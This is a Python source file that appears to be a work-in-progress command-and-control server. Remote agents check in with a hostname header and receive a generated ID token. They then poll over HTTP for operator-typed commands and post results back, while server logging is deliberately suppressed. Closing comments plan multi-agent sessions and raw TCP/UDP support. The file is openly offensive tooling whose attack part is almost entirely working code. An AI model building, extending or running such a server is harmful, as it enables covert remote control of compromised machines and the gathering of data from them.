import logging
from http.server import SimpleHTTPRequestHandler, HTTPServer, ThreadingHTTPServer
import threading
import urllib.parse
from typing import TypedDict, Optional
from concurrent_collections import ConcurrentDictionary
from datetime import datetime, timezone
import secrets
import string
import hmac
from components import component

# 1. Define the Host Record Structure (Type Hinting + Default Factory)
class HostRecord(TypedDict):
    uuid: str
    status: str
    last_seen: Optional[str]
    command: Optional[str]
main_console = "Command (type 'exit to stop:) > "

def get_user_input(user_input):
    global server_command
    while True:
        
        server_command = input(main_console).strip()

        if not component.handle_command(server_command, user_input):
            print("Shutting down...")
            break
        server_command = ""
             


#Disable all the logs from the http.server
class NoLogRequestHandler(SimpleHTTPRequestHandler):
    #Disable all logs from the http.server
    def log_message(self, format, *args):
        pass
    #configure logging to print only the error
    logging.basicConfig(level=logging.ERROR)
    
class MyRequestHandler(NoLogRequestHandler):
    def do_GET(self):
        # #parse the "data" parameter from the URL
        # query_params = urllib.parse.parse_qs(urllib.parse.urlparse(self.path).query)
        # data_param  = query_params.get('data', [''])[0]
        # #print the entered command and the recived "data" parameter
        # if data_param != "":
        #     print(f"\nData parameter recieved:  {data_param}\nCommand (type 'exit to stop:) > ")
        hostname = self.headers.get("host-name", "")
        if hostname != "":
            uuid = self.generate_short_agent_id()
            host_record = self.create_host_record(uuid)
            self.upsert_host(hostname, uuid)
            #self.collective_handle(hostname)
            self.send_response(200)
            self.send_header('Content-type', 'text/plain')
            self.send_header('Authorization', user_input.get(hostname, {}).get("uuid"))
            self.end_headers()
        

    def do_POST(self):
        # 1. Extract and strip whitespace from headers
        hostname = self.headers.get("host-name", "").strip()
        auth_header = self.headers.get("Authorization", "").strip()

        # Optional: Strip 'Bearer ' prefix if you sent 'Bearer <uuid>' earlier
        if auth_header.lower().startswith("bearer "):
            client_uuid = auth_header[7:].strip()
        else:
            client_uuid = auth_header
        # 2. Check if headers are missing/empty (Python equivalent of string.IsNullOrWhiteSpace)
        if not hostname or not client_uuid:
            self.unauthorized_request(400)
            return  # CRITICAL: Stop execution here!

        # 3. Verify that the hostname exists and the UUID matches your ConcurrentDictionary
        expected_uuid = user_input.get(hostname, {}).get("uuid")
        if not expected_uuid or not hmac.compare_digest(client_uuid, expected_uuid):
            self.unauthorized_request(401)
            return  # CRITICAL: Stop execution here!
        
        content_length = int(self.headers.get("Content-Length", 0))
        #read the body from self.rfile
        body_byte = self.rfile.read(content_length)
        #Process the data (ex: handling plain text or json)
        #if the client send text or json
        body_string = body_byte.decode('utf-8')
        if body_string.strip():
            print(f"\nRecieved POST payload from Hostname {hostname}: {body_string}\n{main_console}")
        self.collective_handle(hostname)
        

    def collective_handle(self, hostname):
        global user_input
        #send the user input as a response
        self.send_response(200)
        self.send_header('Content-type', 'text/plain')
        self.send_header('Authorization', user_input.get(hostname, {}).get("uuid"))
        self.end_headers()
        command = user_input.get(hostname, {}).get("command")
        if isinstance(command, str) and command.strip():
            self.wfile.write(bytes(command, 'utf-8'))
        self.upsert_host(hostname, command= "")

    def unauthorized_request(self, status_code=401):
        self.send_response(status_code)
        self.send_header('Content-type', 'text/plain; charset=utf-8')
        self.end_headers()

    def create_host_record(self, uuid: str, status: str = "online", last_seen: Optional[str] = None, command: Optional[str] = None) -> HostRecord:
        """Factory to ensure every host entry strictly follows the required schema."""
        return {
            "uuid": uuid,
            "status": status,
            "last_seen": last_seen or datetime.now(timezone.utc).isoformat(),
            "command": command
        }

    # 3. Thread-Safe Upsert (Insert if Missing, or Update if Exists)
    def upsert_host(self, hostname: str, uuid: Optional[str] = None, command: Optional[str] = None, status: str = "online") -> HostRecord:
        """
        Checks if `hostname` exists:
        - If NOT: creates the new host with the standard structure.
        - If EXISTS: updates `uuid`, `command` (if provided), `status`, and `last_seen`.
        """
        global user_input
        now_iso = datetime.now(timezone.utc).isoformat()

        # Step A: Attempt atomic insert if the hostname does not exist yet.
        # put_if_absent returns None if the key was newly inserted,
        # or returns the existing dictionary if the key already existed.
        new_record = self.create_host_record(
            uuid=uuid or "unknown-uuid",
            status=status,
            last_seen=now_iso,
            command=command
        )
        existing_record = user_input.put_if_absent(hostname, new_record)

        # If None is returned, the host did not exist and was just created atomically!
        if existing_record is None:
            return new_record

        # Step B: Host already exists -> Acquire context lock to safely mutate nested fields
        with user_input.get_locked(hostname) as host_data:
            if uuid is not None:
                host_data["uuid"] = uuid
            if command is not None:
                host_data["command"] = command
            host_data["status"] = status
            host_data["last_seen"] = now_iso
            return dict(host_data)

    def generate_short_agent_id(self, prefix: str = "001", length: int = 9) -> str:
        """Generates a compact ID like '001-urelw1234'."""
        alphabet = string.ascii_lowercase + string.digits
        random_part = ''.join(secrets.choice(alphabet) for _ in range(length))
        return f"{prefix}-{random_part}" if prefix else random_part

if __name__ == "__main__":
    try:
        port = 8000
        server_address = ("", port)
        server_command = ""
        user_input = ConcurrentDictionary()

        #create a an HTTP server with the custom request handler
        httpd = ThreadingHTTPServer(server_address, MyRequestHandler)

        #start the server in a separate thread
        thread = threading.Thread(target=httpd.serve_forever)
        thread.start()

        #start the user input loop
        get_user_input(user_input)

        #stop the server when the user input loop is existed
        httpd.shutdown()
        httpd.server_close()
        print("server stopped")

    except KeyboardInterrupt:
        #handle the ctrl + c to stop the server
        httpd.shutdown()
        httpd.server_close()
        thread.join()
        print("\nServer stopped")

#it lacks multi-session handling(handling mutliple agents gravefully without race condition): it needs multi session implementation
#autocomplete
#can't handle POST request
# it can't handle raw TCP and even UDP
